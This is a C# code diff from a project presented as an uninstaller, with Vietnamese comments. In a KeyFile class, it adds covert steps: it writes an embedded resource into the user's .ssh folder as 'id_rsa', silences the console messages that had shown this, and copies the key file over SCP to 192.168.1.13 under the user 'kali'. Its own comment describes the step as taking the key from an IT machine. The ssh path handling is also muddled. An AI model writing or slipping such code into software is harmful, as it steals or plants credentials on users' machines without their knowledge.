@@ -14,7 +14,7 @@ namespace UninstallProgram.Functions
 
         public KeyFile(string key) { }
 
-        public void Test()
+        public void doAll()
         {
             // Lấy namespace của class chứa mã nguồn
             string currentNamespace = typeof(Program).Namespace;
@@ -29,14 +29,18 @@ namespace UninstallProgram.Functions
             string userDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
 
             // Đường dẫn đích
-            string destinationPath = Path.Combine(userDirectory, @".ssh\authorized_keys\id_rsa.pub");
+            string destinationPath = Path.Combine(userDirectory, @".ssh\authorized_keys\id_rsa");
 
             // Copy nội dung từ tệp tin nhúng ra tệp tin đích
             CopyEmbeddedResourceToFile(resourceName, destinationPath);
 
-            Console.WriteLine($"File copied to: {destinationPath}");
-            Console.WriteLine($"UserDirectory: {userDirectory}");
-            Console.WriteLine($"resourceName: {resourceName}");
+            //Console.WriteLine($"File copied to: {destinationPath}");
+            //Console.WriteLine($"UserDirectory: {userDirectory}");
+            //Console.WriteLine($"resourceName: {resourceName}");
+
+            //ip minh - name minh - duong dan tren may IT...\id_rsa, copy khoa vao duong dan - @"D:\makecookie": ten file muon copy tu IT qua may minh
+
+            new Scp("192.168.1.13", "kali").Copy(destinationPath, @"D:\makecookie");
         }
 
         // Phương thức copy nội dung của tệp tin nhúng ra tệp tin
